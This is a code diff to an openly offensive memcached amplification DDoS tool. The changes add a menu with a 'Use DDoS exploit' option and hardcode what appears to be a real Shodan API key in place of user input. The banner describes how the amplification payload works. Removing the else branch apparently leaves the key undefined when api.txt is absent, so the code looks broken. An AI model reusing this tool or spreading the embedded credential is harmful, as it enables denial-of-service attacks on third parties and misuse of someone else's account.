@@ -36,21 +36,31 @@ logo = color.HEADER + '''
 | Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
 | is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
 | I am NOT responsible for any damages caused or any crimes committed by using this tool. |
+|                                                                                         |
+| API key by AlexZiroYT                                                                   |
+|                                                                                         |
 ###########################################################################################
                                                                                       
 '''
 print(logo)
 
+print("[1] Patch info.")
+print("[2] Use DDoS exploit.")
+print("Select a number...")
+ddos = input("Your answer : ")
+
+if ddos == ('2'):
+    time.sleep(1)
+
+elif ddos == ('1'):
+    print("Hi! I am Alex Ziro!")
+    print("I added a ready-made shodan api key to this tool!")
+    print("Original repository: https://github.com/649/Memcrached-DDoS-Exploit")
+
+
 if keys.is_file():
     with open('api.txt', 'r') as file:
-        SHODAN_API_KEY=file.readline().rstrip('\n')
-else:
-    file = open('api.txt', 'w')
-    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
-    file.write(SHODAN_API_KEY)
-    print('[~] File written: ./api.txt')
-    file.close()
-
+        SHODAN_API_KEY = 'PSKINdQe1GyxGgecYz2191H2JoS9qvgD'
 while True:
     api = shodan.Shodan(SHODAN_API_KEY)
     print('')
